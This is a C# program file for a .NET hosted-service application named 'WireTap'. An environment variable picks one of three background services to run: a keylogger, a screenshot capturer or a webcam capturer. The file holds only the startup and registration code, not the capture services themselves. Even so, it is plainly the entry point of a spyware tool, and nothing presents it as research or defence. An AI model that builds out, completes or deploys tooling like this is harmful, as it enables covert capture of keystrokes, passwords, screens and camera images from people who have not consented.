namespace WireTap.HostedService
{
    using Microsoft.Extensions.DependencyInjection;
    using Microsoft.Extensions.Hosting;
    using System;
    using System.Collections.Generic;
    using System.Threading.Tasks;

    public class Program
    {
        static Program()
        {
            ServiceName = Environment.GetEnvironmentVariable("SERVICE_NAME");
        }

        public static string ServiceName { get; }

        public static async Task Main(string[] args)
        {
            try
            {
                var host = Host.CreateDefaultBuilder(args)
                      .ConfigureServices((hostContext, services) => services.ConfigureServices())
                      .Build();

                try
                {
                    await host.RunAsync();
                }
                catch (Exception innerEx)
                {
                    Console.WriteLine(innerEx.Message);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }

    public static class Startup
    {
        private static class ServiceRegistrar
        {
            public static Dictionary<string, Action<IServiceCollection>> ServiceRegistrations;

            static ServiceRegistrar()
            {
                ServiceRegistrations = new Dictionary<string, Action<IServiceCollection>>
                {
                    {  "keylogger", services => services.AddHostedService<KeyloggerService>()   },
                    { "screenshot", services => services.AddHostedService<ScreenshotService>()  },
                    {     "webcam", services => services.AddHostedService<WebcamService>()      }
                };
            }
        }

        public static IServiceCollection ConfigureServices(this IServiceCollection services)
        {
            services.AddHostedService();

            return services;
        }

        public static IServiceCollection AddHostedService(this IServiceCollection services)
        {
            var serviceRegistration = ServiceRegistrar.ServiceRegistrations[Program.ServiceName];
            serviceRegistration(services);

            return services;
        }
    }
}